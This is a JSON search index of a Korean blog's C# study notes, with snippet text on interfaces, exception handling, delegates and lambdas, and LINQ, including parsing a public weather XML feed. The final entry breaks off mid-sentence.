[ { "title": "C# 프로그래밍 - CH12 Linq", "url": "/posts/Csharp-ch12/", "categories": "Notes, C#", "tags": "", "date": "2022-03-19 12:00:00 +0900", "snippet": " LinqLinq(Language-Integrated Query)는 컬렉션 형태의 데이터를 쉽게 다루고자 SQL을 본따 만든 구문임Linq를 사용하면 C# 객체의 집합을 쉽게 관리할 수 있으며, SQL 서버를 연동하여 데이터베이스 관리를 간단하게 할 수도 있음데이터를 선별하는 정형화된 코드 (Linq X)List&amp;lt;int&amp;gt; input = new List&amp;lt;int&amp;gt;() { 1, 2, 3, 4, 5 };List&amp;lt;int&amp;gt; output = new List&amp;lt;int&amp;gt;();foreach (var item in input){ if (item%2==0) { output.Add(item); }}return output;Linq를 사용하여 위 예제를 간단하게 작성List&amp;lt;int&amp;gt; input = new List&amp;lt;int&amp;gt;() { 1, 2, 3, 4, 5 };return from item in input where item%2==0 select item; Linq 기본 구문Linq 구문은 다음과 같이 이루어져 있음 from in where orderby select List&amp;lt;int&amp;gt; input = new List&amp;lt;int&amp;gt;() { 1, 2, 3, 4, 5 };var output = from item in input where item%2==0 orderby item select item;그룹화와 조인 등 추가 구문들이 있지만 이 책에서는 다루지 않음 from in select 구문모든 Linq 쿼리는 from, in, select 키워드를 포함해야 함from &amp;lt;변수 이름(원하는 이름 지정)&amp;gt; in &amp;lt;컬렉션 이름&amp;gt;select &amp;lt;결과에 넣을 요소&amp;gt;List&amp;lt;int&amp;gt; output = new List&amp;lt;int&amp;gt;();foreach (var &amp;lt;변수 이름(원하는 이름 지정)&amp;gt; in &amp;lt;컬렉션 이름&amp;gt;){ output.Add(&amp;lt;결과에 넣을 요소&amp;gt;);}기존의 리스트에서 요소를 제곱한 새로운 요소를 가진 리스트를 생성하는 예제static void Main(string[] args){ List&amp;lt;int&amp;gt; input = new List&amp;lt;int&amp;gt;() { 1, 2, 3, 4, 5 }; var output = from item in input select item * item; foreach (var item in output) { Console.WriteLine(item); }}1491625 where 구문조건을 지정할 때 사용함from &amp;lt;변수 이름(원하는 이름 지정)&amp;gt; in &amp;lt;컬렉션 이름&amp;gt;where &amp;lt;조건식&amp;gt;select &amp;lt;변수 이름(원하는 이름 지정)&amp;gt;List&amp;lt;int&amp;gt; output = new List&amp;lt;int&amp;gt;();foreach (var &amp;lt;변수 이름(원하는 이름 지정)&amp;gt; in &amp;lt;컬렉션 이름&amp;gt;){ if (조건식) { output.Add(&amp;lt;결과에 넣을 요소&amp;gt;); }}리스트에서 요소가 5 초과, 짝수인 것만을 뽑아 새로운 리스트를 생성하는 예제static void Main(string[] args){ List&amp;lt;int&amp;gt; input = new List&amp;lt;int&amp;gt;() { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 }; var output = from item in input where (item&amp;gt;5) &amp;amp;&amp;amp; (item%2==0) select item; foreach (var item in output) { Console.WriteLine(item); }} orderby 구문ascending = 오름차순 (기본)descending = 내림차순from &amp;lt;변수 이름(원하는 이름 지정)&amp;gt; in &amp;lt;컬렉션 이름&amp;gt;where &amp;lt;조건식&amp;gt;orderby &amp;lt;정렬 대상&amp;gt; &amp;lt;정렬 순서&amp;gt;select &amp;lt;변수 이름(원하는 이름 지정)&amp;gt;요소를 내림차순 정렬한 새로운 리스트를 생성하는 예제static void Main(string[] args){ List&amp;lt;int&amp;gt; input = new List&amp;lt;int&amp;gt;() { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 }; var output = from item in input where (item&amp;gt;5) &amp;amp;&amp;amp; (item%2==0) orderby item descending select item; foreach (var item in output) { Console.WriteLine(item); }} Linq 결과의 자료형과 반환IEnumerable 인터페이스의 다형성을 활용하여 다음과 같이 자료형을 지정하고 넣을 수 있음IEnumerable&amp;lt;int&amp;gt; output = from item in input where item%2==0 select item;다만 이는 쿼리와 select 구문에 입력하는 자료형에 따라 굉장히 다양하게 바뀔 수 있으므로그냥 var 키워드를 사용하는게 가장 안정적이고 편함하지만 메서드에서 반환하는 경우에는 var 키워드를 지정할 수 없으므로 이런 경우 배열 또는 리스트로 확실히 자료형을 지정하고 싶다면 ToArray() 메서드 또는 ToList() 메서드를 사용해야 함ToArray() 메서드public int[] SelectEven(int[] input){ return (from item in input where item%2==0 select item).ToArray&amp;lt;int&amp;gt;();}ToList() 메서드public List&amp;lt;int&amp;gt; SelectEven(List&amp;lt;int&amp;gt; input){ return (from item in input where item%2==0 select item).ToList&amp;lt;int&amp;gt;();} 익명 객체C#은 다음과 같은 형식으로 클래스를 만들지 않아도 객체를 생성할 수 있음이처럼 클래스 이름 없이 생성하는 객체를 익명 객체라고 부름new { &amp;lt;속성A&amp;gt; = &amp;lt;값&amp;gt;, &amp;lt;속성B&amp;gt; = &amp;lt;값&amp;gt; };일반적으로는 사용하지 않지만 Linq와 함께 사용할 때 굉장히 큰 효과를 발휘함 익명 객체를 다루는 간단한 예제Linq의 select 구문에 익명 객체를 활용한 예제클래스를 따로 선언하지 않고도 객체의 배열을 만들고 활용할 수 있음static void Main(string[] args){ List&amp;lt;int&amp;gt; input = new List&amp;lt;int&amp;gt;() { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 }; var output = from item in input where item%2==0 select new { A = item*2, B = item*item, C = 100 }; foreach (var item in output) { Console.WriteLine(item.A); Console.WriteLine(item.B); Console.WriteLine(item.C); Console.WriteLine(); }}441008161001236100166410020100100 Linq 구문과 클래스 활용클래스를 활용한 Linqclass Program{ class Product { public string Name { get; set; } public int Price { get; set; } public override string ToString() { return Name + &quot; : &quot; + Price + &quot;원&quot;; } } static void Main(string[] args) { List&amp;lt;Product&amp;gt; input = new List&amp;lt;Product&amp;gt;() { new Product() { Name = &quot;고구마&quot;, Price = 1500 }, new Product() { Name = &quot;사과&quot;, Price = 2400 }, new Product() { Name = &quot;바나나&quot;, Price = 1000 }, new Product() { Name = &quot;배&quot;, Price = 3000 }, new Product() { Name = &quot;감자&quot;, Price = 1000 }, new Product() { Name = &quot;토마토&quot;, Price = 2000 }, new Product() { Name = &quot;옥수수&quot;, Price = 1500 }, new Product() { Name = &quot;자두&quot;, Price = 500 } }; var output = from item in input where item.Price&amp;gt;1500 orderby item.Name ascending select item; foreach (var item in output) { Console.WriteLine(item); } }}배 : 3000원사과 : 2400원토마토 : 2000원 Linq to XML웹에서 XML 가져오기using System.Xml.Linq;class Program{ static void Main(string[] args) { string url = &quot;http://www.kma.go.kr/wid/queryDFSRSS.jsp?zone=1150061500&quot;; XElement xElement = XElement.Load(url); Console.WriteLine(xElement); }}XML 파싱 기본파싱 (Parsing) = 구문 분석 (데이터를 원하는 형태로 변환하는 것)static void Main(string[] args){ string url = &quot;http://www.kma.go.kr/wid/queryDFSRSS.jsp?zone=1150061500&quot;; XElement xElement = XElement.Load(url); var xmlQuery = from item in xElement.Descendants(&quot;data&quot;) select item; foreach (var item in xmlQuery) { Console.WriteLine(item); }}내부 태그 추출static void Main(string[] args){ string url = &quot;http://www.kma.go.kr/wid/queryDFSRSS.jsp?zone=1150061500&quot;; XElement xElement = XElement.Load(url); var xmlQuery = from item in xElement.Descendants(&quot;data&quot;) select item; foreach (var item in xmlQuery) { Console.Write(item.Element(&quot;hour&quot;).Value + &quot;\\t&quot;); Console.Write(item.Element(&quot;day&quot;).Value + &quot;\\t&quot;); Console.Write(item.Element(&quot;temp&quot;).Value + &quot;\\t&quot;); Console.Write(item.Element(&quot;wdKor&quot;).Value + &quot;\\t&quot;); Console.Write(item.Element(&quot;wfKor&quot;).Value + &quot;\\t&quot;); Console.Write(item.Element(&quot;tmn&quot;).Value + &quot;\\t&quot;); Console.Write(item.Element(&quot;tmx&quot;).Value + &quot;\\t&quot;); Console.WriteLine(); }}익명 객체 사용static void Main(string[] args){ string url = &quot;http://www.kma.go.kr/wid/queryDFSRSS.jsp?zone=1150061500&quot;; XElement xElement = XElement.Load(url); var xmlQuery = from item in xElement.Descendants(&quot;data&quot;) select new { Hour = item.Element(&quot;hour&quot;).Value, Day = item.Element(&quot;day&quot;).Value, Temp = item.Element(&quot;temp&quot;).Value, WdKor = item.Element(&quot;wdKor&quot;).Value, WfKor = item.Element(&quot;wfKor&quot;).Value, Tmn = item.Element(&quot;tmn&quot;).Value, Tmx = item.Element(&quot;tmx&quot;).Value }; foreach (var item in xmlQuery) { Console.Write(item.Hour + &quot;\\t&quot;); Console.Write(item.Day + &quot;\\t&quot;); Console.Write(item.Temp + &quot;\\t&quot;); Console.Write(item.WdKor + &quot;\\t&quot;); Console.Write(item.WfKor + &quot;\\t&quot;); Console.Write(item.Tmn + &quot;\\t&quot;); Console.Write(item.Tmx + &quot;\\t&quot;); Console.WriteLine(); }}클래스 활용class Program{ class Weather { public string Hour { get; set; } public string Day { get; set; } public string Wf { get; set; } public string Temp { get; set; } public string WdKor { get; set; } public string WfKor { get; set; } public string Tmn { get; set; } public string Tmx { get; set; } } static void Main(string[] args) { string url = &quot;http://www.kma.go.kr/wid/queryDFSRSS.jsp?zone=1150061500&quot;; XElement xElement = XElement.Load(url); var xmlQuery = from item in xElement.Descendants(&quot;data&quot;) select new Weather() { Hour = item.Element(&quot;hour&quot;).Value, Day = item.Element(&quot;day&quot;).Value, Temp = item.Element(&quot;temp&quot;).Value, WdKor = item.Element(&quot;wdKor&quot;).Value, WfKor = item.Element(&quot;wfKor&quot;).Value, Tmn = item.Element(&quot;tmn&quot;).Value, Tmx = item.Element(&quot;tmx&quot;).Value }; foreach (var item in xmlQuery) { Console.Write(item.Hour + &quot;\\t&quot;); Console.Write(item.Day + &quot;\\t&quot;); Console.Write(item.Temp + &quot;\\t&quot;); Console.Write(item.WdKor + &quot;\\t&quot;); Console.Write(item.WfKor + &quot;\\t&quot;); Console.Write(item.Tmn + &quot;\\t&quot;); Console.Write(item.Tmx + &quot;\\t&quot;); Console.WriteLine(); } }}XML 속성 추출item.Attribute(&quot;속성 이름&quot;).Valueitem.Attribute[&quot;속성 이름&quot;].Value" }, { "title": "C# 프로그래밍 - CH11 델리게이터와 람다", "url": "/posts/Csharp-ch11/", "categories": "Notes, C#", "tags": "", "date": "2022-03-18 10:00:00 +0900", "snippet": " Preview현대 프로그래밍 언어들은 메서드라는 행위를 변수처럼 활용하는 기능이 있음이는 메서드 자체를 매개변수로 전달하거나 반환할 수 있다는 말이고, 연산자까지 활용할 수 있게 된다는 말임C#은 이러한 것을 델리게이터로 구현했음 델리게이터 관련 용어메서드는 행위를, 변수는 데이터(값)를 나타냄변수는 메서드와 달리 굉장히 유연해 매개변수 등으로 이리저리 전달할 수 있음우리 삶에서도 물질적인 것은 누군가에게 전달할 수 있지만 행위는 전달할 수가 없음행위를 저장하고 전달할 수 있다면 굉장히 편리하겠다는 생각으로 메서드를 변수로 사용하는 개념이 프로그래밍 언어에 등장하기 시작함C#은 델리게이터와 람다라는 개념으로 이를 구현함델리게이터(≠무명 델리게이터)는 형식화된 메서드로, 일종의 클래스를 선언하는 것과 같음그리고 이것을 변수로 만들어 초기화할 때 사용하는 것이 메서드 이름, 무명 델리게이터, 람다임delegate void TestDelegate(); // 델리게이터 = 자료형을 선언하는 방법TestDelegate testDelegate = &amp;lt;메서드 이름, 무명 델리게이터, 람다&amp;gt; // 델리게이터 변수를 초기화 델리게이터 기본다음은 델리게이터를 사용한 정렬 구현 예제임class Program{ class Product { public string Name { get; set; } public int Price { get; set; } } static void Main(string[] args) { List&amp;lt;Product&amp;gt; products = new List&amp;lt;Product&amp;gt;() { new Product() { Name = &quot;감자&quot;, Price = 500 }, new Product() { Name = &quot;사과&quot;, Price = 700 }, new Product() { Name = &quot;고구마&quot;, Price = 400 }, new Product() { Name = &quot;배추&quot;, Price = 600 }, new Product() { Name = &quot;상추&quot;, Price = 300 } }; products.Sort(SortWithPrice); // Comparison 델리게이터 foreach (var item in products) { Console.WriteLine(item.Name + &quot; : &quot; + item.Price); } } static int SortWithPrice(Product a, Product b) { return a.Price.CompareTo(b.Price); }}Comparison 델리게이터의 메서드 형식은 마이크로소프트에서 제공하는 관련 다큐멘테이션을 참고하면 됨public delegate int Comparison&amp;lt;in T&amp;gt;(T x, T y);정렬할 때마다 정렬의 종류만큼 메서드를 만들어줄 수는 없으므로 이러한 코드를 간단하게 만들고자 무명 델리게이터를 사용함 무명 델리게이터 기본delegate(&amp;lt;매개변수&amp;gt;, &amp;lt;매개변수&amp;gt;) { /* 코드 */ return /* 반환 */ ;}정렬 예제의 델리게이터를 무명 델리게이터로 대체함static void Main(string[] args){ List&amp;lt;Product&amp;gt; products = new List&amp;lt;Product&amp;gt;() { new Product() { Name = &quot;감자&quot;, Price = 500 }, new Product() { Name = &quot;사과&quot;, Price = 700 }, new Product() { Name = &quot;고구마&quot;, Price = 400 }, new Product() { Name = &quot;배추&quot;, Price = 600 }, new Product() { Name = &quot;상추&quot;, Price = 300 } }; products.Sort(delegate(Product a, Product b) // 무명 델리게이터로 정렬 방법을 정의 { return a.Price.CompareTo(b.Price); }); foreach (var item in products) { Console.WriteLine(item.Name + &quot; : &quot; + item.Price); }} 람다 기본델리게이터를 조금 더 편하게 사용할 수 있게 해주는 것이 람다임델리게이터를 짧게 쓴다고 생각하면 됨매개변수의 자료형을 지정할 필요도 없음(&amp;lt;매개변수&amp;gt;, &amp;lt;매개변수&amp;gt;) =&amp;gt; { /* 코드 */ return /* 반환 */;}만약 메서드 내부에 입력할 코드가 딱히 없다면 다음과 같이 간략화할 수 있음(a, b) =&amp;gt; /* 반환 */정렬 예제의 무명 델리게이터를 람다로 대체함static void Main(string[] args){ List&amp;lt;Product&amp;gt; products = new List&amp;lt;Product&amp;gt;() { new Product() { Name = &quot;감자&quot;, Price = 500 }, new Product() { Name = &quot;사과&quot;, Price = 700 }, new Product() { Name = &quot;고구마&quot;, Price = 400 }, new Product() { Name = &quot;배추&quot;, Price = 600 }, new Product() { Name = &quot;상추&quot;, Price = 300 } }; products.Sort((a, b) =&amp;gt; // Sort() 메서드의 매개변수로 람다를 지정 { return a.Price.CompareTo(b.Price); }); foreach (var item in products) { Console.WriteLine(item.Name + &quot; : &quot; + item.Price); }}해당 람다를 다음과 같이 간략화할 수 있음products.Sort((a, b) =&amp;gt; a.Price.CompareTo(b.Price));즉, 델리게이터는 메서드를 쉽게 사용할 수 있는 형태라고 생각하면 됨 클로저원래 지역 변수는 메서드 내부에서 선언되어 메서드가 종료될 때 사라지는 것이 정석이나, 델리게이터와 람다를 사용하게 되면 이러한 규칙에 위배되는 경우가 생김이처럼 지역 변수가 메서드가 끝나도 사라지지 않고 남는 현상을 클로저(Closer)라고 부르며, 클로저가 일어난 변수를 클로저 변수라고 부름 이름 있는 델리게이터위에서 살펴본 무명 델리게이터는 자신의 원하는 형식으로 자유롭게 선언할 수 있는 델리게이터임반대로 이름이 있는 델리게이터를 그냥 델리게이터라고 부르는데, 이러한 델리게이터에는 정해진 형식이 있음무명 델리게이터와 이름 있는 델리게이터는 카테고리 자체가 다르므로 둘을 확실하게 구분해야 함 델리게이터 선언접근 제한자 delegate 반환형 델리게이터 이름(매개변수);이름 있는 델리게이터는 특정한 형식을 가진 메서드를 자료형으로 선언하는 방법임델리게이터는 자료형이므로 클래스를 선언하는 위치와 같은 위치라면 어디서든지 선언할 수 있음사실 위와 같이 델리게이터를 선언하면, Delegate 클래스의 상속을 받는 클래스를 선언하는 것임많은 C# 개발자가 델리게이터를 멤버로 취급하여 멤버를 선언하는 위치에 선언하는데, 클래스 외부에도 선언할 수 있다는 점을 기억해야 함 델리게이터 선언 위치public delegate void TestDelegateA(); // 클래스 외부class Program{ public delegate void TestDelegateB(); // 클래스 내부 static void Main(string[] args) { TestDelegateA delegateA; // 선언한 델리게이터 자료형으로 변수 선언 TestDelegateB delegateB; }} 델리게이터 자료형 변수 초기화위에서 살펴보았던 세 가지 방법을 사용하여 초기화할 수 있음class Program{ public delegate void TestDelegate(); static void Main(string[] args) { TestDelegate delegateA = TestMethod; // 메서드 이름 TestDelegate delegateB = delegate() { }; // 무명 델리게이터 TestDelegate delegateC = () =&amp;gt; { }; // 람다 delegateA(); // 델리게이터는 일반 메서드처럼 호출할 수 있음 delegateB(); delegateC(); } static void TestMethod() { }} 델리게이터 활용델리게이터를 활용하는 대표적인 형태는 콜백 메서드(Callback Method)임콜백 메서드 = 매개변수로 전달하는 메서드기본적인 형태public delegate void CustomDelegate();public void Method(CustomDelegate customDelegate){ CustomDelegate();}델리게이터 PrintProcess를 선언 후 콜백 메서드로 활용하는 예제class Student{ public string Name { get; set; } public double Score { get; set; } public Student(string name, double score) { this.Name = name; this.Score = score; } public override string ToString() { return this.Name + &quot; : &quot; + this.Score; }}class Students{ private List&amp;lt;Student&amp;gt; listOfStudent = new List&amp;lt;Student&amp;gt;(); public delegate void PrintProcess(Student list); public void Add(Student student) { listOfStudent.Add(student); } public void Print() { Print((student) =&amp;gt; { Console.WriteLine(student); }); } public void Print(PrintProcess process) { foreach (var item in listOfStudent) { process(item); } }}class Program{ static void Main(string[] args) { Students students = new Students(); students.Add(new Student(&quot;염수경&quot;, 4.2)); students.Add(new Student(&quot;염수연&quot;, 4.3)); students.Print(); students.Print((student) =&amp;gt; { Console.WriteLine(); Console.WriteLine(&quot;이름: &quot; + student.Name); Console.WriteLine(&quot;학점: &quot; + student.Score); }); }}염수경 : 4.2염수연 : 4.3이름: 염수경학점: 4.2이름: 염수연학점: 4.3 다시 한번 내 언어로 정리하기델리게이트는 메서드를 다른 메서드의 매개변수로 전달하기 위한 일종의 껍질이다.알맹이인 메서드와 껍질인 델리게이트는 매개변수의 타입 및 갯수, 반환형의 타입이 모두 일치해야한다.델리게이트의 선언 형태는 마치 함수를 정의하는 선언식처럼 보이지만 내부적으로는 특별한 클래스로 변환된다.따라서 선언한 델리게이트를 사용할 때는 new 키워드로 델리게이트 객체를 생성하여 사용한다. 참고 포스팅 델리게이터 연산델리게이터에 연산자를 적용할 수 있는 언어는 C#이 거의 유일함즉, 없어도 프로그래밍하는데 지장은 없는 기능임하지만 있으면 나름 편리하며 C#의 기능은 대부분 이미 델리게이터 연산을 사용해 구현되어 있으므로 사용하지 않을 수는 없음일반 연산자와 마찬가지로 + 로 델리게이터를 더하거나, - 로 델리게이터를 뺄 수 있음델리게이터 덧셈과 뺄셈class Program{ public delegate void SendString(string message); static void Main(string[] args) { SendString sayHello, sayGoodbye, multiDelegate; sayHello = Hello; sayGoodbye = GoodBye; multiDelegate = sayHello + sayGoodbye; multiDelegate(&quot;염수경&quot;); Console.WriteLine(); multiDelegate -= sayGoodbye; multiDelegate(&quot;염수경&quot;); } public static void Hello(string message) { Console.WriteLine(&quot;안녕하세요. &quot; + message + &quot;씨...&quot;); } public static void GoodBye(string message) { Console.WriteLine(&quot;안녕히 가세요. &quot; + message + &quot;씨...&quot;); }}안녕하세요. 염수경씨...안녕히 가세요. 염수경씨...안녕하세요. 염수경씨... 스레드 생성하기Thread 클래스를 사용함Thread 클래스의 매개변수에는 메서드 이름, 무명 델리게이터, 람다를 넣을 수 있음class Program{ static void Main(string[] args) { Thread threadA = new Thread(TestMethod); // 메서드 이름 Thread threadB = new Thread(delegate() // 무명 델리게이터 { }); Thread threadC = new Thread(() =&amp;gt; // 람다 { }); } public static void TestMethod() { }}이렇게 만들어진 스레드는 Start() 메서드로 실행함다음은 람다를 사용해 스레드 3개를 생성하고 실행하는 예제임static void Main(string[] args){ Thread threadA = new Thread(() =&amp;gt; { for(int i=0; i&amp;lt;1000; i++) { Console.Write(&quot;A&quot;); } }); Thread threadB = new Thread(() =&amp;gt; { for(int i=0; i&amp;lt;1000; i++) { Console.Write(&quot;B&quot;); } }); Thread threadC = new Thread(() =&amp;gt; { for(int i=0; i&amp;lt;1000; i++) { Console.Write(&quot;C&quot;); } }); threadA.Start(); threadB.Start(); threadC.Start();}" }, { "title": "C# 프로그래밍 - CH10 예외 처리", "url": "/posts/Csharp-ch10/", "categories": "Notes, C#", "tags": "", "date": "2022-03-11 06:00:00 +0900", "snippet": " 예외 처리프로그램이 실행되는 동안 문제가 발생하면 프로그램이 자동으로 중단됨이렇게 실행 중에 발생한 오류를 예외(Exception)라고 부름이런 오류를 대처할 수 있게 하는 것을 예외 처리(Exception Handling)라고 부름반면 아예 프로그램이 컴파일조차 안 되게 하는 프로그래밍 언어의 문법적인 오류를 컴파일 시점 오류(Compile-time Error) 또는 문법 오류(Syntax Error)라고 함예외는 두 가지 방법으로 처리함 기본 예외 처리 고급 예외 처리 기본 예외 처리예외가 발생하지 않게 사전에 해결하는 것다음은 IndexOutOfRangeException 을 기본 예외 처리하는 예제임static void Main(string[] args){ string[] array = { &quot;가&quot;, &quot;나&quot; }; Console.Write(&quot;숫자를 입력해주세요: &quot;); int input = int.Parse(Console.ReadLine()); Console.WriteLine(&quot;입력한 위치의 값은 &#39;&quot; + array[input] + &quot;&#39; 입니다.&quot;);}Unhandled exception. System.IndexOutOfRangeException: Index was outside the bounds of the array.배열의 길이를 확인해서 입력된 값이 배열의 길이를 넘으면, 잘못되었다고 알려줌 (기본 예외 처리)static void Main(string[] args){ string[] array = { &quot;가&quot;, &quot;나&quot; }; Console.Write(&quot;숫자를 입력해주세요: &quot;); int input = int.Parse(Console.ReadLine()); if (input &amp;lt; array.Length) { Console.WriteLine(&quot;입력한 위치의 값은 &#39;&quot; + array[input] + &quot;&#39; 입니다.&quot;); } else { Console.WriteLine(&quot;인덱스 범위를 넘었습니다.&quot;); }} 고급 예외 처리try 키워드, catch 키워드, finally 키워드로 예외를 처리하는 방법이를 try catch finally 구문이라고 부름try{ // 예외 발생 시}catch (Exception exception){ // 여기서 처리함}finally{ // 여기는 무조건 실행함}catch 구문 또는 finally 구문이 필요하지 않다면, 해당 부분을 생략하고 사용할 수 있음다음은 FormatException 을 고급 예외 처리하는 예제임static void Main(string[] args){ Console.Write(&quot;입력: &quot;); string input = Console.ReadLine(); int index = int.Parse(input); Console.WriteLine(&quot;입력 숫자: &quot; + index);}Unhandled exception. System.FormatException: Input string was not in a correct format.try catch finally 구문을 사용해 예외를 처리함 (고급 예외 처리)static void Main(string[] args){ Console.Write(&quot;입력: &quot;); string input = Console.ReadLine(); try { int index = int.Parse(input); Console.WriteLine(&quot;입력 숫자: &quot; + index); } catch (Exception exception) { Console.WriteLine(&quot;예외가 발생했습니다.&quot;); Console.WriteLine(exception.GetType()); } finally { Console.WriteLine(&quot;프로그램이 종료되었습니다.&quot;); }} finally 구문의 사용 여부에 따라 결과가 달라지는 경우 catch 구문 내부에서 return 키워드를 만날 때 catch 구문 내부에서 try catch 구문을 사용했는데 break 또는 continue 키워드를 만날 때 어떠한 상황이 되어도 finally 구문은 무조건 실행하고 끝낸다는 규칙 때문임또한 중간에 finally 구문을 벗어나는 키워드들은 사용할 수 없음 (ex.return) 예외 객체어떤 예외가 발생했는지와 관련된 정보를 전달해주기 위해 사용함예외 객체는 다음과 같이 catch 구문의 괄호 안에 들어있는 변수를 나타냄try{}catch (Exception exception) // Exception 클래스의 인스턴스로 예외 객체라고 부름{}예외 객체에서 정보 추출static void Main(string[] args){ Console.Write(&quot;입력: &quot;); string input = Console.ReadLine(); try { int index = int.Parse(input); Console.WriteLine(&quot;입력 숫자: &quot; + index); } catch (Exception exception) { Console.WriteLine(&quot;예외가 발생했습니다.&quot;); Console.WriteLine(exception.GetType()); Console.WriteLine(exception.Message); Console.WriteLine(exception.StackTrace); }} 예외 객체를 사용한 예외 구분try catch 구문을 사용할 때 catch 구문을 여러 개 사용하여 예외에 따라 서로 다른 처리를 할 수 있음try{}catch (&amp;lt;예외1&amp;gt;){}catch (&amp;lt;예외2&amp;gt;){}static void Main(string[] args){ Console.Write(&quot;입력: &quot;); try { string input = Console.ReadLine(); int[] array = { 52, 273, 32, 103 }; int index = int.Parse(input); Console.WriteLine(&quot;입력 숫자: &quot; + index); Console.WriteLine(&quot;배열 요소: &quot; + array[index]); } catch (FormatException exception) { Console.WriteLine(&quot;FormatException 발생&quot;); Console.WriteLine(exception.GetType() + &quot;이 발생했습니다.&quot;); } catch (IndexOutOfRangeException exception) { Console.WriteLine(&quot;IndexOutOfRangeException 발생&quot;); Console.WriteLine(exception.GetType() + &quot;이 발생했습니다.&quot;); }}입력: ㅇㅅㅇFormatException 발생System.FormatException이 발생했습니다.입력: 100입력 숫자: 100IndexOutOfRangeException 발생System.IndexOutOfRangeException이 발생했습니다. 예외 강제 발생throw new Exception();예외를 강제로 발생시킬 때는 throw 키워드를 사용하며, throw 키워드 뒤에는 Exception 클래스의 인스턴스를 입력함무조건적으로 예외 던지기class Program{ static void Main(string[] args) { throw new Exception(); }}Unhandled exception. System.Exception: Exception of type &#39;System.Exception&#39; was thrown.강제로 던진 예외의 예외 처리하기class Program{ static void Main(string[] args) { try { throw new Exception(); } catch (Exception exception) { Console.WriteLine(&quot;예외가 발생했습니다.&quot;); } }}예외가 발생했습니다.Box 클래스 예외 관련 구현class Program{ class Box { private int width; public int Width { get { return width; } set { if (value &amp;gt; 0) { width = value; } else { throw new Exception(&quot;너비는 자연수를 입력해주세요.&quot;); } } } private int height; public int Height { get { return height; } set { if (value &amp;gt; 0) { height = value; } else { throw new Exception(&quot;높이는 자연수를 입력해주세요.&quot;); } } } public Box(int width, int height) { Width = width; Height = height; } public int Area() { return this.width * this.height; } } static void Main(string[] args) { Box box = new Box(-10, -20); }}Unhandled exception. System.Exception: 너비는 자연수를 입력해주세요. 사용자 정의 예외class CustomException : Exception{ public CustomException(string message) : base(message) // 부모 생성자 호출 { }}class Program{ static void Main(string[] args) { try { throw new CustomException(&quot;사용자 정의 예외&quot;); } catch (CustomException exception) { Console.WriteLine(exception.Message); } }}사용자 정의 예외" }, { "title": "C# 프로그래밍 - CH9 인터페이스", "url": "/posts/Csharp-ch9/", "categories": "Notes, C#", "tags": "", "date": "2022-03-09 20:00:00 +0900", "snippet": " 인터페이스개발자가 실수하지 않게 도와주는 기능특별한 기능이 아니라 이런 최소 사항을 지켜서 만들면 나머지는 우리가 처리해주겠다 라는 규약임인터페이스는 모두 대문자 I 로 시작함 IComparable 인터페이스비교할 때 사용하는 규약다음과 같은 모델 클래스가 있다고 가정함class Program{ class Product { public string Name { get; set; } public int Price { get; set; } public override string ToString() { return Name + &quot; : &quot; + Price + &quot;원&quot;; } } static void Main(string[] args) { List&amp;lt;Product&amp;gt; list = new List&amp;lt;Product&amp;gt;() { new Product() { Name = &quot;고구마&quot;, Price = 1500 }, new Product() { Name = &quot;사과&quot;, Price = 2400 }, new Product() { Name = &quot;바나나&quot;, Price = 1000 }, new Product() { Name = &quot;배&quot;, Price = 3000 } }; list.Sort(); // 오류 발생 foreach (var item in list) { Console.WriteLine(item); } }}오류가 발생하는 이유 → 해당 클래스를 어떤 기준으로 정렬해야할지 모르기 때문임이러한 기준을 정해주려면 해당 클래스 내부에 IComparable 인터페이스를 구현해주어야 함인터페이스를 구현하려면 해당 인터페이스를 클래스 상속하듯 적어주면 됨class Product : IComparable{ public string Name { get; set; } public int Price { get; set; } public override string ToString() { return Name + &quot; : &quot; + Price + &quot;원&quot;; }}이후 IComparable 에 커서를 놓고 Ctrl + . 를 누른 후 인터페이스 구현 을 클릭하면 CompareTo() 메서드가 자동으로 생성됨class Product : IComparable{ public string Name { get; set; } public int Price { get; set; } public override string ToString() { return Name + &quot; : &quot; + Price + &quot;원&quot;; } public int CompareTo(object obj) { throw new NotImplementedException(); }}IComparable 인터페이스는 CompareTo() 메서드를 구현해야 한다는 규약을 갖고 있으므로 다음과 같이 Price 속성의 CompareTo() 메서드로 Price 속성끼리 비교할 수 있도록 해줌public int CompareTo(object obj){ return this.Price.CompareTo((obj as Product).Price);}참고로 Price 속성은 int 자료형이며, C# 내부에서 int 자료형은 IComparable 인터페이스의 규약을 지키므로 Price 속성에 CompareTo() 메서드가 있는 것이제 코드를 실행하면 Sort() 메서드가 정상적으로 실행됨이렇듯 Sort() 를 실행하려면 반드시 CompareTo() 메서드를 구현해야하며, 실수로 구현하지 않을 시 정렬에서 문제가 발생함따라서 CompareTo() 메서드를 무조건 구현하게 만드는 IComparable 인터페이스를 사용하도록 하는 것임 인터페이스 인스턴스화인터페이스는 실체가 없는 규칙이므로 인스턴스화할 수 없음 IDisposable 인터페이스C# 자체에서 제공하는 인터페이스는 메서드를 호출할 때뿐만 아니라, 키워드를 사용할 때에도 적용됨IDisposable 인터페이스는 using 블록을 사용할 때 자동으로 호출되는 규약임class Program{ class Dummy : IDisposable { } static void Main(string[] args) { }}마찬가지로 IDisposable 에 커서를 놓고 Ctrl + . 를 누른 후 인터페이스 구현 을 클릭하면 Dispose() 메서드가 자동으로 생성됨class Program{ class Dummy : IDisposable { public void Dispose() { throw new NotImplementedException(); } } static void Main(string[] args) { }}파일 처리와 관련된 내용을 배우지 않았으므로 다음과 같이 간단한 출력만 하도록 Dispose() 메서드를 구현함class Program{ class Dummy : IDisposable { public void Dispose() { Console.WriteLine(&quot;Dispose() 메서드를 호출합니다.&quot;); } } static void Main(string[] args) { Dummy dummy = new Dummy(); dummy.Dispose(); }}Dispose() 메서드는 using 블록이라는 기능을 사용할 때 자동으로 호출되는 기능임따라서 아래와 같이 코드를 구성한 경우, using 블록의 괄호 내에서 생성한 클래스가 IDisposable 인터페이스의 상속을 받을 경우, using 블록을 벗어날 때 자동으로 Dispose() 메서드를 호출함static void Main(string[] args){ using (Dummy dummy = new Dummy()) { }}코드를 실행하면 Dispose() 메서드를 따로 호출하지 않아도 실행되는 것을 볼 수 있음 인터페이스 생성interface 인터페이스 이름 { }인터페이스는 클래스와 동급의 카테고리로, 클래스를 생성하는 위치라면 어디서든지 만들 수 있음인터페이스를 생성할 때는 interface 키워드를 사용함같은 파일에 인터페이스를 생성할 시, 클래스를 생성할 때와 같은 위치에 인터페이스를 넣어주면 됨그러나 인터페이스는 여러 곳에서 사용할 규약이므로 이렇게 한 파일 